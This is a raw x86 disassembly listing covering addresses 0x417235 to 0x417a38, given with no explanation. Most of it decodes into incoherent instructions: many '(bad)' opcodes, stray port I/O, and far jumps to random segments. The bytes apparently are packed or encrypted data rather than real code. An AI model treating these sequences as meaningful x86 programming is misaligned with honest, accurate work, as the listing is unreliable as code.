  417235:	fbstp  TBYTE PTR [ebp+eax*1+0x10513ea]
  41723c:	inc    esp
  41723d:	dec    edx
  41723e:	inc    ebx
  41723f:	add    ebx,DWORD PTR [edx+ebx*1]
  417242:	dec    ebx
  417243:	jmp    0x417527
  417248:	fsubrp st(0),st
  41724a:	(bad)  
  41724b:	stos   BYTE PTR es:[edi],al
  41724c:	mov    gs,WORD PTR [edx-0x16]
  41724f:	ins    BYTE PTR es:[edi],dx
  417250:	leave  
  417251:	pop    ebx
  417252:	sub    al,0x41
  417254:	ds jo  0x4172c4
  417257:	pop    ds
  417258:	jo     0x417280
  41725a:	jg     0x4172cc
  41725c:	mov    ecx,0x5570707e
  417261:	sbb    BYTE PTR [edx+eiz*1+0x7cfdb148],cl
  417268:	sahf   
  417269:	mul    DWORD PTR ds:0x55a2c4d9
  41726f:	pop    edx
  417270:	out    0x60,al
  417272:	adc    BYTE PTR [edx-0x12860c90],bl
  417278:	adc    eax,0xcf88ebf3
  41727d:	(bad)  
  41727e:	xchg   edx,eax
  41727f:	pop    ss
  417280:	sbb    edi,DWORD PTR ds:0xe1df3130
  417286:	scas   eax,DWORD PTR es:[edi]
  417287:	adc    bh,al
  417289:	ds jle 0x417235
  41728c:	pop    esp
  41728d:	cmp    BYTE PTR [edx],0xc9
  417290:	ret    0x3376
  417293:	(bad)  
  417294:	and    BYTE PTR cs:[ebx+0x66ea438e],bh
  41729b:	cdq    
  41729c:	xchg   ebp,eax
  41729d:	addr16 mov edx,0x44008aa2
  4172a3:	jl     0x417235
  4172a5:	mov    eax,0x417dd01
  4172aa:	jb     0x4172eb
  4172ac:	mov    BYTE PTR [ebx+0x19],bh
  4172af:	inc    esi
  4172b0:	or     ebp,DWORD PTR [eax+0x6]
  4172b3:	pop    ds
  4172b4:	lds    ebp,FWORD PTR [eax+eiz*2]
  4172b7:	cmp    eax,0xd7dcb00d
  4172bc:	(bad)
  4172bf:	es (bad) 
  4172c1:	sub    cl,cl
  4172c3:	adc    eax,0xeb0b1abf
  4172c8:	dec    esi
  4172c9:	jp     0x417331
  4172cb:	inc    edx
  4172cc:	jne    0x417269
  4172ce:	mov    esi,0x94f3e96b
  4172d3:	or     BYTE PTR es:[esp+eiz*2+0x7962ee3f],dl
  4172db:	cmp    BYTE PTR [eax-0x40],dl
  4172de:	hlt    
  4172df:	gs aas 
  4172e1:	push   es
  4172e2:	mov    esp,0xdec18e88
  4172e7:	retf   
  4172e8:	jb     0x417360
  4172ea:	mov    DWORD PTR [edi],ebp
  4172ec:	sti    
  4172ed:	or     edi,DWORD PTR [ecx-0x2b]
  4172f0:	sbb    BYTE PTR [ecx+0x316d8996],ah
  4172f6:	push   ecx
  4172f7:	sar    BYTE PTR [ecx],0xff
  4172fa:	out    dx,eax
  4172fb:	push   edi
  4172fc:	shr    DWORD PTR [ebp+0xf13cfd6],1
  417302:	dec    esp
  417303:	jmp    0x4172c2
  417305:	jnp    0x417346
  417307:	push   0x59fa492c
  41730c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41730d:	xchg   ecx,eax
  41730e:	inc    ebp
  41730f:	mov    cl,0xcc
  417311:	mov    ebx,0x7fc3d4ea
  417316:	sbb    al,0x86
  417318:	out    dx,eax
  417319:	sub    eax,0xa821adfa
  41731e:	sub    BYTE PTR [edx-0x67b4c03b],0x75
  417325:	(bad)  
  417326:	shr    BYTE PTR [edx+eiz*8-0x28],0xc6
  41732b:	jmp    0x6a667f60
  417330:	lods   al,BYTE PTR ds:[esi]
  417331:	pop    ebp
  417332:	pop    ds
  417333:	mul    BYTE PTR [ebx-0x4a]
  417336:	into   
  417337:	lods   al,BYTE PTR ds:[esi]
  417338:	test   BYTE PTR [ebp-0x75],bh
  41733b:	jl     0x4172e1
  41733d:	mov    dh,0x83
  41733f:	and    ebp,esi
  417341:	dec    edx
  417342:	sub    eax,0x325ebf8e
  417347:	daa    
  417348:	out    0xd0,eax
  41734a:	adc    esi,ebp
  41734c:	add    BYTE PTR [edx-0x5],dl
  41734f:	xor    DWORD PTR [edi+0x74a5a28c],ebx
  417355:	push   ds
  417356:	adc    eax,0x7db70c2
  41735b:	ins    DWORD PTR es:[edi],dx
  41735c:	push   0x631dc5bb
  417361:	push   ss
  417362:	cli    
  417363:	pop    esi
  417364:	pop    es
  417365:	pop    edx
  417366:	call   0xd434:0x50fda282
  41736d:	pop    eax
  41736e:	ret    
  41736f:	xchg   BYTE PTR [edi-0x2],ah
  417372:	sub    cl,BYTE PTR [ecx+0x32]
  417375:	add    cl,BYTE PTR [eax+edx*2+0x6e2e816d]
  41737c:	mov    dl,0xa5
  41737e:	shl    BYTE PTR [esi+0x7],0xa5
  417382:	aas    
  417383:	push   esi
  417384:	mov    WORD PTR [edx+edx*2],es
  417387:	mov    ebp,ds
  417389:	popf   
  41738a:	lods   al,BYTE PTR ds:[esi]
  41738b:	mov    ch,0xd
  41738d:	cmp    ebx,eax
  41738f:	retf   0x98ac
  417392:	rcr    BYTE PTR [ebp-0x44],0x9
  417396:	sub    cl,ah
  417398:	call   0xf059:0xe9d2fada
  41739f:	ffree  st(6)
  4173a1:	sub    BYTE PTR [eax],dh
  4173a3:	jbe    0x41738d
  4173a5:	and    dl,BYTE PTR [edi-0x65]
  4173a8:	je     0x417370
  4173aa:	add    DWORD PTR [esi+0x25cfad8c],eax
  4173b0:	pop    ss
  4173b1:	addr16 sbb ebp,edi
  4173b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4173b5:	out    dx,eax
  4173b6:	test   DWORD PTR [edi-0x28],0xaee5f7a2
  4173bd:	mov    dl,0x1e
  4173bf:	pop    edx
  4173c0:	lock sub BYTE PTR [esi],dh
  4173c3:	pushf  
  4173c4:	pop    es
  4173c5:	iret   
  4173c6:	jne    0x41739f
  4173c8:	(bad)  
  4173ca:	les    eax,FWORD PTR [ecx]
  4173cc:	test   al,0x25
  4173ce:	stos   BYTE PTR es:[edi],al
  4173cf:	sahf   
  4173d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4173d1:	mov    ds:0xb35597d5,eax
  4173d6:	cs jmp 0xbee2:0x2070d4e8
  4173de:	ficom  WORD PTR [edi-0x2b000219]
  4173e4:	repnz loopne 0x4173c4
  4173e7:	sbb    al,0x56
  4173e9:	xor    al,0xa9
  4173eb:	aaa    
  4173ec:	dec    ebp
  4173ed:	aam    0xb0
  4173ef:	jl     0x417425
  4173f1:	xor    DWORD PTR [ebx],edi
  4173f3:	cmp    BYTE PTR [ebx+0xe],dh
  4173f6:	mov    es,eax
  4173f8:	mov    ah,0xb3
  4173fa:	mov    al,ds:0x74589448
  4173ff:	xchg   BYTE PTR [edi-0x319676eb],al
  417405:	lds    esp,FWORD PTR [ecx+0xec80a2b]
  41740b:	call   0x74a943f5
  417410:	fsubr  QWORD PTR [ecx-0x3d8c8303]
  417416:	adc    al,0xaa
  417418:	retf   0x1bc7
  41741b:	mov    esi,0x870ab49d
  417420:	mov    esi,0x339c65b0
  417425:	push   edi
  417426:	xchg   esp,eax
  417427:	mov    ah,ah
  417429:	or     BYTE PTR [ebp-0x70],0x84
  41742d:	sbb    edx,DWORD PTR [eax+0x21]
  417430:	sbb    eax,DWORD PTR [ebx+0xb711384]
  417436:	adc    DWORD PTR [edx+0x70],esi
  417439:	pop    ss
  41743a:	xor    al,ch
  41743c:	fadd   DWORD PTR [edx+0x673b1de9]
  417442:	dec    ecx
  417443:	popa   
  417444:	(bad)  
  417445:	rcr    BYTE PTR [eax],1
  417447:	mov    eax,esp
  417449:	xor    edi,0xfffffff4
  41744c:	cdq    
  41744d:	mov    ebp,0x4150a61d
  417453:	xlat   BYTE PTR ds:[ebx]
  417454:	push   edx
  417455:	or     ah,BYTE PTR [edi+ecx*2-0x3175292c]
  41745c:	mov    dl,0x5c
  41745e:	mov    ah,ah
  417460:	add    ah,cl
  417462:	bound  ecx,QWORD PTR [edi+ebp*4]
  417465:	sub    eax,0x60976df0
  41746a:	retf   0x75ac
  41746d:	adc    DWORD PTR [eax+0x49c94576],edx
  417473:	enter  0x992,0x63
  417477:	jnp    0x41746e
  417479:	test   eax,0xe88615b8
  41747e:	cdq    
  41747f:	adc    ah,al
  417481:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417482:	dec    esi
  417483:	sbb    eax,0x2f8cbc2b
  417488:	ficomp WORD PTR [edx]
  41748a:	arpl   WORD PTR [ebx-0x79],bx
  41748d:	(bad)  
  41748f:	add    dh,BYTE PTR ds:0x1329c74e
  417495:	mov    edx,DWORD PTR [ebx]
  417497:	push   eax
  417498:	xlat   BYTE PTR ds:[ebx]
  417499:	pop    esi
  41749a:	xor    edx,esp
  41749c:	adc    DWORD PTR [ebp-0x36],ebx
  41749f:	inc    eax
  4174a0:	xchg   ebp,eax
  4174a1:	push   esp
  4174a2:	mov    cl,0xce
  4174a4:	call   0x146a:0xc8b88a24
  4174ab:	out    dx,eax
  4174ac:	and    BYTE PTR [ecx+0x77a5beeb],0xd5
  4174b3:	sti    
  4174b4:	lods   al,BYTE PTR ds:[esi]
  4174b5:	xor    DWORD PTR [edi+0x52dcf99d],edx
  4174bb:	dec    esp
  4174bc:	shl    BYTE PTR [ebx+edx*2],0x5b
  4174c0:	inc    esi
  4174c1:	call   0x644e:0x8840f00d
  4174c8:	push   edi
  4174c9:	mov    bh,0x4e
  4174cb:	pop    ecx
  4174cc:	mov    ah,0x4d
  4174ce:	or     DWORD PTR ds:0xc6c4f033,esp
  4174d4:	int3   
  4174d5:	mov    ah,0x40
  4174d7:	and    DWORD PTR [esi+0x285b0f64],0x35c8872f
  4174e1:	xchg   ebx,eax
  4174e2:	fwait
  4174e3:	call   0x4d74110b
  4174e8:	adc    BYTE PTR ds:0x8c24f185,0x56
  4174ef:	push   ebx
  4174f0:	pop    eax
  4174f1:	imul   esp,DWORD PTR [esi-0x4],0xffffffbd
  4174f5:	repnz std 
  4174f7:	xchg   edx,eax
  4174f8:	lea    ecx,[edx+0x6c]
  4174fb:	sub    eax,0xea7362f4
  417500:	enter  0x9c46,0x9a
  417504:	int3   
  417505:	cmp    DWORD PTR [esi+0x73adcace],eax
  41750b:	dec    ebp
  41750c:	inc    esp
  41750d:	aas    
  41750e:	push   ds
  41750f:	rcr    BYTE PTR [esi],0x6f
  417512:	dec    eax
  417513:	icebp  
  417514:	daa    
  417515:	popf   
  417516:	mov    dl,0x1c
  417518:	mov    edx,0x2e5ff969
  41751d:	push   esi
  41751e:	outs   dx,DWORD PTR ds:[esi]
  41751f:	ret    
  417520:	sub    DWORD PTR [eax],ecx
  417522:	xor    al,BYTE PTR [eax]
  417524:	dec    ch
  417526:	jb     0x41755b
  417528:	rol    BYTE PTR [ecx],cl
  41752a:	pop    ebp
  41752b:	hlt    
  41752c:	pop    ebx
  41752d:	mov    eax,DWORD PTR [ebp-0xc]
  417530:	pop    edi
  417531:	jmp    0x417815
  417536:	cld    
  417537:	pop    esi
  417538:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417539:	addr16 popa 
  41753b:	gs mov esp,0x68365a61
  417541:	mov    DWORD PTR [edx-0x2f],ecx
  417544:	neg    DWORD PTR [ecx+edi*4]
  417547:	and    al,0x7f
  417549:	jo     0x417504
  41754b:	jle    0x4175bd
  41754d:	jo     0x417553
  41754f:	(bad)  
  417551:	sub    eax,0x896ea717
  417556:	pushw  0xf7e3
  41755a:	mov    ds:0x171545f1,eax
  41755f:	inc    edx
  417560:	inc    eax
  417561:	scas   al,BYTE PTR es:[edi]
  417562:	ins    DWORD PTR es:[edi],dx
  417563:	sti    
  417564:	das    
  417565:	dec    esi
  417566:	mov    dl,0x36
  417568:	and    esi,ebp
  41756a:	nop
  41756b:	jg     0x4175d3
  41756d:	vpslld xmm2,xmm2,XMMWORD PTR [edi]
  417571:	push   ecx
  417572:	out    0xe0,al
  417574:	in     al,dx
  417575:	sahf   
  417576:	scas   eax,DWORD PTR es:[edi]
  417577:	lahf   
  417578:	push   esi
  417579:	fild   WORD PTR [ebp+0xa]
  41757c:	ffreep st(2)
  41757e:	push   edi
  41757f:	cmp    eax,0xed05921b
  417584:	int    0x96
  417586:	cmp    eax,ebp
  417588:	cmp    eax,0x62ea1b49
  41758d:	pop    es
  41758e:	scas   al,BYTE PTR es:[edi]
  41758f:	xchg   DWORD PTR [edi-0x3a087edd],esp
  417595:	mov    dl,ah
  417597:	cmp    DWORD PTR [ebx+0x3aa7d8f6],ebp
  41759d:	cmp    BYTE PTR [edx-0x4b],ch
  4175a0:	out    dx,al
  4175a1:	push   ebx
  4175a2:	cli    
  4175a3:	xchg   edx,eax
  4175a4:	aas    
  4175a5:	adc    eax,0x350a0f58
  4175aa:	repnz shl edx,cl
  4175ad:	imul   ebx,DWORD PTR [ebx],0x8cb73234
  4175b3:	ins    DWORD PTR es:[edi],dx
  4175b4:	jmp    0x279e:0x4d93cd9e
  4175bb:	dec    esi
  4175bc:	mov    ebp,0xea2f1dbd
  4175c1:	cmp    eax,0xf35db4d2
  4175c6:	sub    BYTE PTR [ebx+0x1f8a02e6],bh
  4175cc:	pop    edi
  4175cd:	jno    0x41761c
  4175cf:	mov    dl,0xa1
  4175d1:	xor    edx,DWORD PTR [ebp+0x66afef3b]
  4175d7:	outs   dx,DWORD PTR ds:[esi]
  4175d8:	pop    ecx
  4175d9:	shr    BYTE PTR [edi-0x3e],cl
  4175dc:	mov    edi,0xfc8ecd36
  4175e1:	pop    esi
  4175e2:	das    
  4175e3:	add    esp,ecx
  4175e5:	scas   al,BYTE PTR es:[edi]
  4175e6:	push   edi
  4175e7:	lods   al,BYTE PTR ds:[esi]
  4175e8:	mov    ds:0x8d1db570,al
  4175ed:	into   
  4175ee:	inc    ebx
  4175ef:	cs in  eax,dx
  4175f1:	xchg   esp,eax
  4175f2:	add    ebx,DWORD PTR [esi-0x5a3750d2]
  4175f8:	ins    BYTE PTR es:[edi],dx
  4175f9:	jg     0x41764d
  4175fb:	add    DWORD PTR [ebp-0x36],eax
  4175fe:	xchg   ebp,eax
  4175ff:	jns    0x417635
  417601:	dec    esp
  417602:	inc    ecx
  417603:	fistp  DWORD PTR [edx]
  417605:	mov    bl,0xbf
  417607:	jb     0x417602
  417609:	retf   0xaee4
  41760c:	ds int 0x3b
  41760f:	jbe    0x4175cb
  417611:	fwait
  417612:	xor    esp,DWORD PTR [esi-0x6b]
  417615:	lea    esi,[edi]
  417617:	or     DWORD PTR [esi+0x26],ecx
  41761a:	inc    edi
  41761b:	out    dx,al
  41761c:	mul    BYTE PTR [ebx+ebp*4]
  41761f:	push   esp
  417620:	icebp  
  417621:	adc    ah,bh
  417623:	pop    esi
  417624:	pop    esi
  417625:	pop    es
  417626:	push   0xffffff94
  417628:	xor    al,0x33
  41762a:	and    al,0x97
  41762c:	stos   DWORD PTR es:[edi],eax
  41762d:	popf   
  41762e:	mov    ecx,ecx
  417630:	push   cs
  417631:	dec    edi
  417632:	xor    eax,0x2b275d2e
  417637:	addr16 hlt 
  417639:	(bad)  [eax]
  41763b:	jmp    0x4175cd
  41763d:	mov    gs,WORD PTR [ecx-0x5f04dfea]
  417643:	mov    edx,0x38bafa6a
  417648:	sub    ch,al
  41764a:	xchg   ecx,eax
  41764b:	sbb    cl,BYTE PTR [ecx+ecx*1]
  41764e:	retf   0xb50c
  417651:	mov    dh,0x5b
  417653:	inc    edx
  417654:	mul    DWORD PTR [esp+esi*2-0x6b]
  417658:	sub    DWORD PTR [edx+0x37],ecx
  41765b:	mov    eax,ds:0x719e88b9
  417660:	addr16 je 0x417686
  417663:	mov    BYTE PTR [edx+0x65],dh
  417666:	in     eax,dx
  417667:	adc    BYTE PTR gs:[eax-0x50],cl
  41766b:	in     eax,dx
  41766c:	sub    edi,DWORD PTR [ebx+0x6954ff6b]
  417672:	int3   
  417673:	lahf   
  417674:	push   ds
  417675:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417676:	lods   eax,DWORD PTR ds:[esi]
  417677:	and    al,0xe5
  417679:	sub    dl,ah
  41767b:	outs   dx,DWORD PTR ds:[esi]
  41767c:	jg     0x41769b
  41767e:	sbb    DWORD PTR [ecx-0x47],ebp
  417681:	ror    DWORD PTR [ecx+0xf],0x37
  417685:	into   
  417686:	and    eax,0x583e4c37
  41768b:	mov    DWORD PTR [edx+esi*1+0x69f33f55],ebx
  417692:	mov    cl,0x59
  417694:	sar    DWORD PTR [ecx],cl
  417696:	sbb    BYTE PTR [esi],al
  417698:	mov    ebp,0xb7b5c441
  41769d:	or     BYTE PTR [edi-0x4ad78640],dl
  4176a3:	nop
  4176a4:	xchg   BYTE PTR [esi],al
  4176a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4176a7:	call   0x1e5e:0xd8c2d1d1
  4176ae:	fbld   TBYTE PTR [ecx+0x11f1f520]
  4176b4:	mov    edx,0x5e93c485
  4176b9:	dec    edx
  4176ba:	dec    edx
  4176bb:	imul   edi,esp,0x4e0833ea
  4176c1:	in     eax,dx
  4176c2:	sub    BYTE PTR [eax],ch
  4176c4:	push   es
  4176c5:	ja     0x4176b6
  4176c7:	mov    ecx,0xedb6f9a6
  4176cc:	sbb    al,0xaf
  4176ce:	lods   eax,DWORD PTR ds:[esi]
  4176cf:	stos   BYTE PTR es:[edi],al
  4176d0:	call   0x255c6751
  4176d5:	mov    eax,ds:0x9eacf67e
  4176da:	adc    al,0xfc
  4176dc:	xchg   ebp,eax
  4176dd:	int    0x84
  4176df:	push   0xd030b6b8
  4176e4:	dec    esp
  4176e5:	sbb    BYTE PTR [edi],dh
  4176e7:	lods   eax,DWORD PTR ds:[esi]
  4176e8:	and    BYTE PTR [edx+edi*4-0x44272243],0x3e
  4176f0:	cmp    DWORD PTR [ebp+0x6f9b3a76],ecx
  4176f6:	mov    DWORD PTR [ebx-0x66],eax
  4176f9:	mov    dh,0x11
  4176fb:	mov    al,ds:0x2811bc07
  417700:	les    edi,FWORD PTR ds:0xcd7202f6
  417706:	adc    edx,edx
  417708:	call   0x9998:0xf2421d77
  41770f:	mov    esp,0x69264efd
  417714:	(bad)  
  417715:	(bad)  
  417716:	lock jecxz 0x417744
  417719:	adc    BYTE PTR [eax],al
  41771b:	add    BYTE PTR [ebx],cl
  41771d:	or     edx,ecx
  41771f:	mov    ecx,0x43ac4ae6
  417724:	mov    eax,ds:0x5754bd4c
  417729:	dec    ebp
  41772a:	dec    esp
  41772b:	icebp  
  41772c:	or     eax,ebx
  41772e:	and    DWORD PTR [edx+0x61ae38a5],0xce35cb3f
  417738:	mov    BYTE PTR [edx-0xbc7bd2d],cl
  41773e:	int    0x40
  417740:	ss dec esi
  417742:	dec    ebp
  417743:	stos   BYTE PTR es:[edi],al
  417744:	(bad)  [esi-0x6a]
  417747:	(bad)  
  417749:	or     eax,0x6b408b08
  41774e:	dec    edx
  41774f:	clc    
  417750:	jo     0x4176ec
  417752:	dec    ebp
  417753:	fistp  WORD PTR [edi+ecx*2-0x4b]
  417757:	in     eax,0xb3
  417759:	cs inc ebx
  41775b:	cdq    
  41775c:	outs   dx,BYTE PTR ds:[esi]
  41775d:	jo     0x4176e4
  41775f:	mov    ds:0x48cc255d,eax
  417764:	call   0x3cfe:0x82ffd0f5
  41776b:	mov    ds,ebx
  41776d:	mov    ?,WORD PTR ds:0x1e50c870
  417773:	sub    bl,BYTE PTR ss:[ebx-0x7a91e905]
  41777a:	in     eax,0x0
  41777c:	xchg   DWORD PTR [eax],ecx
  41777e:	out    dx,eax
  41777f:	mov    dl,0xd6
  417781:	mov    bl,0x8d
  417783:	adc    eax,0xb243484e
  417788:	pop    edi
  417789:	xor    ecx,eax
  41778b:	daa    
  41778c:	je     0x41777e
  41778e:	add    esp,DWORD PTR [edx+0x3d49b6a4]
  417794:	test   eax,0x9680be0a
  417799:	imul   esi,esp,0xe09cc63c
  41779f:	and    ebp,DWORD PTR [ecx-0x3cdb2818]
  4177a5:	adc    ebx,esi
  4177a7:	add    al,0xab
  4177a9:	pop    edx
  4177aa:	popa   
  4177ab:	ins    BYTE PTR es:[edi],dx
  4177ac:	gs add eax,0x8f8cbde6
  4177b2:	mov    WORD PTR [ebp+0x30],ds
  4177b5:	add    al,0x12
  4177b7:	sti    
  4177b8:	pop    esi
  4177b9:	dec    esi
  4177ba:	fstp   DWORD PTR [edx+0x17]
  4177bd:	(bad)  
  4177be:	(bad)  
  4177bf:	leave  
  4177c0:	add    eax,0xd9a96821
  4177c5:	xchg   ecx,eax
  4177c6:	or     al,0x8b
  4177c8:	jne    0x41775e
  4177ca:	mov    cl,0x73
  4177cc:	xchg   ebx,eax
  4177cd:	lds    esi,FWORD PTR [ebp-0x2e3a2405]
  4177d3:	or     dl,bl
  4177d5:	xchg   ebx,eax
  4177d6:	hlt    
  4177d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4177d8:	std    
  4177d9:	sbb    BYTE PTR [ebx],bl
  4177db:	pop    esp
  4177dc:	loop   0x41781f
  4177de:	add    DWORD PTR [edi+0x39],ebp
  4177e1:	and    DWORD PTR [edx-0x3e],0x79
  4177e5:	imul   ecx,DWORD PTR [ecx],0x3
  4177e8:	aaa    
  4177e9:	sub    BYTE PTR [edx],dl
  4177eb:	mov    esi,0x9206d0d9
  4177f0:	pop    ebp
  4177f1:	sbb    ebx,DWORD PTR [ebp-0x4a]
  4177f4:	add    eax,0xdf806754
  4177f9:	sar    BYTE PTR ds:0x19c4878d,cl
  4177ff:	mov    eax,0xcf11d003
  417804:	fs cli 
  417806:	mov    al,0xb
  417808:	adc    BYTE PTR [eax+0x9],ch
  41780b:	daa    
  41780c:	jbe    0x417802
  41780e:	ins    DWORD PTR es:[edi],dx
  41780f:	mov    ds:0x83ada8a9,eax
  417814:	ins    BYTE PTR es:[edi],dx
  417815:	pop    esi
  417816:	pop    ebx
  417817:	leave  
  417818:	ret    0x10
  41781b:	dec    ebp
  41781c:	push   ebp
  41781d:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  417823:	mov    esp,ebp
  417825:	or     ah,dh
  417827:	dec    ebp
  417828:	add    bh,al
  41782a:	add    BYTE PTR [eax],cl
  41782c:	add    BYTE PTR [eax],al
  41782e:	mov    DWORD PTR [eax],0x40f44545
  417834:	xor    DWORD PTR [eax],eax
  417836:	test   DWORD PTR [ebx-0x34070b64],ecx
  41783c:	(bad)  
  41783d:	enter  0x4d45,0xbc
  417841:	mov    esi,DWORD PTR [eax]
  417843:	hlt    
  417844:	test   ebx,ecx
  417846:	pushf  
  417847:	enter  0x4df8,0x8b
  41784b:	mov    DWORD PTR [ebp-0x20],0x890208
  417852:	inc    ebp
  417853:	inc    ebp
  417854:	cld    
  417855:	xor    cl,BYTE PTR [ebx-0xb38b300]
  41785b:	or     BYTE PTR [ebx+0x0],dl
  41785e:	mov    ebx,0x8bd5500
  417863:	call   DWORD PTR [ecx-0x1]
  417866:	pop    es
  417867:	mov    ch,0x33
  417869:	dec    ebx
  41786b:	(bad)  
  41786c:	mov    eax,0x72009ca4
  417871:	push   DWORD PTR [edx]
  417873:	or     BYTE PTR [eax],al
  417875:	jmp    0xff89:0x75c84d03
  41787c:	dec    ebp
  41787d:	loopne 0x41784f
  41787f:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  417885:	add    BYTE PTR [ebx],dh
  417887:	mov    ecx,ebx
  417889:	hlt    
  41788a:	add    ecx,ebx
  41788c:	enter  0x899c,0x32
  417890:	dec    ebp
  417891:	add    ecx,eax
  417893:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  417899:	or     DWORD PTR [ebx-0xb00b29c],0x0
  4178a0:	xor    ecx,ebx
  4178a2:	retf   
  4178a3:	enter  0x4d03,0xc8
  4178a7:	mov    DWORD PTR fs:[eax],ebx
  4178aa:	lea    eax,[eax]
  4178ac:	push   esp
  4178ad:	mov    edi,edi
  4178af:	fs (bad) 
  4178b1:	(bad)  
  4178b2:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  4178b8:	push   0xffffffff
  4178ba:	and    bh,bh
  4178bc:	pop    ecx
  4178bd:	inc    eax
  4178be:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  4178c4:	push   0xffffff8b
  4178c6:	pop    ecx
  4178c7:	cld    
  4178c8:	dec    ebp
  4178c9:	lea    ecx,[ecx+0x45ff08ff]
  4178cf:	mov    BYTE PTR [edx+0x1],cl
  4178d2:	add    BYTE PTR [eax],al
  4178d4:	mov    DWORD PTR [ebp+0x8],0x58008d
  4178db:	dec    DWORD PTR [ebp-0x77]
  4178de:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  4178e5:	cld    
  4178e6:	dec    ebp
  4178e7:	jne    0x41791c
  4178e9:	lea    eax,[ebx]
  4178eb:	push   eax
  4178ec:	mov    edi,edi
  4178ee:	or     BYTE PTR [ecx+0x54a845],cl
  4178f4:	add    al,ch
  4178f6:	(bad)  
  4178f7:	sub    esp,ebp
  4178f9:	add    BYTE PTR [eax],al
  4178fb:	rol    BYTE PTR [eax],0x84
  4178fe:	inc    ebp
  4178ff:	add    dh,BYTE PTR [esi+0x0]
  417902:	add    BYTE PTR [ebp-0x73],al
  417905:	mov    ebp,DWORD PTR [esp+edx*4]
  417908:	inc    DWORD PTR [eax]
  41790a:	lea    ecx,[ebx-0x30074f4]
  417910:	call   0x428495
  417915:	add    BYTE PTR [ebp+0x0],cl
  417918:	jne    0x41795b
  41791a:	dec    DWORD PTR [ebx-0x76210314]
  417920:	dec    ebp
  417921:	add    DWORD PTR [ebp+0x0],esi
  417924:	(bad)  
  417925:	xchg   ebp,eax
  417926:	loopne 0x417927
  417928:	inc    eax
  417929:	inc    DWORD PTR [eax]
  41792b:	mov    ecx,DWORD PTR [ebp-0x4]
  41792e:	xor    edx,DWORD PTR [edx+0x7201b8]
  417934:	add    BYTE PTR [edx],dl
  417936:	enter  0x4d90,0x0
  41793a:	mov    eax,DWORD PTR [eax]
  41793c:	hlt    
  41793d:	add    al,0xa5
  41793f:	mov    al,0xff
  417941:	add    bh,bh
  417943:	add    BYTE PTR [ebx],dh
  417945:	inc    DWORD PTR [ebx]
  417947:	sbb    al,0x89
  417949:	jne    0x417923
  41794b:	mov    esp,DWORD PTR [ecx+0x4500fc]
  417951:	mov    eax,DWORD PTR [ebp-0xff0048]
  417957:	mov    DWORD PTR [eax-0x70],0xee58ed89
  41795e:	inc    DWORD PTR [ebp-0x75]
  417961:	fisttp QWORD PTR [eax+eiz*8]
  417964:	test   DWORD PTR [esi-0x1],esp
  417967:	inc    ebp
  417968:	(bad)  
  417969:	aas    
  41796a:	inc    ebp
  41796b:	(bad)  
  41796c:	lea    edi,[esp+eiz*2-0x1]
  417970:	inc    edi
  417972:	mov    DWORD PTR ds:0x8000c7a0,edi
  417978:	mov    ebp,esi
  41797a:	cld    
  41797b:	in     al,0x8d
  41797d:	inc    ebp
  41797e:	jmp    eax
  417980:	(bad)  
  417981:	fisttp WORD PTR [eax+0x8801c7]
  417987:	jecxz  0x4179ce
  417989:	out    dx,al
  41798a:	inc    DWORD PTR [ebp-0x4]
  41798d:	out    0x8d,eax
  41798f:	aas    
  417990:	inc    edi
  417992:	jmp    FWORD PTR [eax-0x78]
  417995:	inc    DWORD PTR [ecx]
  417997:	mov    DWORD PTR [eax],0xc7a83d
  41799d:	ins    BYTE PTR es:[edi],dx
  41799e:	test   edi,edi
  4179a0:	pandn  mm0,mm5
  4179a3:	aas    
  4179a4:	add    bh,al
  4179a6:	mov    esi,DWORD PTR [eax-0x4]
  4179a9:	inc    DWORD PTR [eax+0xdf01e0]
  4179af:	(bad)  
  4179b0:	or     BYTE PTR [ebp+eax*2-0x1],dh
  4179b4:	mov    ebp,ebx
  4179b6:	xchg   esp,eax
  4179b7:	fild   DWORD PTR [eax]
  4179b9:	(bad)  
  4179ba:	mov    edi,DWORD PTR [eax+0x3]
  4179bd:	(bad)  
  4179be:	cmp    al,0xe7
  4179c0:	dec    ebp
  4179c1:	leave  
  4179c2:	mov    ebp,eax
  4179c4:	fsubr  DWORD PTR [ecx]
  4179c6:	add    BYTE PTR [eax],al
  4179c8:	lea    ecx,[ebx-0x7f0003b4]
  4179ce:	push   edx
  4179cf:	add    DWORD PTR [ebp+0x0],edx
  4179d2:	mov    esi,DWORD PTR [eax]
  4179d4:	mov    WORD PTR [ebx-0x7a750000],?
  4179da:	add    esi,DWORD PTR [ebp-0x78]
  4179dd:	mov    eax,DWORD PTR [eax]
  4179df:	cld    
  4179e0:	push   0x7d
  4179e2:	dec    DWORD PTR [ebx+0xd88c]
  4179e8:	push   edx
  4179e9:	mov    edx,DWORD PTR [ecx-0x4]
  4179ec:	call   DWORD PTR [eax+0x7d01fc]
  4179f2:	mov    ebx,edx
  4179f4:	cld    
  4179f5:	add    BYTE PTR [eax+0x560150],dl
  4179fb:	test   DWORD PTR [ebp+0x75],eax
  4179fe:	in     al,0x8b
  417a00:	in     al,dx
  417a01:	cld    
  417a02:	(bad)  
  417a03:	jge    0x417999
  417a05:	mov    esp,ebx
  417a07:	fsub   st,st(7)
  417a09:	add    bh,al
  417a0b:	mov    ebx,DWORD PTR [eax-0x7a6f8f04]
  417a11:	add    edi,edi
  417a13:	add    bh,bh
  417a15:	mov    eax,0x50d800ed
  417a1a:	inc    ebp
  417a1b:	push   esi
  417a1c:	fisttp WORD PTR [ebx+0x4dc7f43f]
  417a22:	test   BYTE PTR [ebx],dh
  417a24:	fadd   DWORD PTR ds:0x4572c2
  417a2a:	jmp    0x4179ed
  417a2c:	fild   DWORD PTR [edi+eax*8-0x22ff73ff]
  417a33:	inc    esi
  417a34:	jo     0x417a36
  417a36:	test   edi,eax
  417a38:	jmp    esp
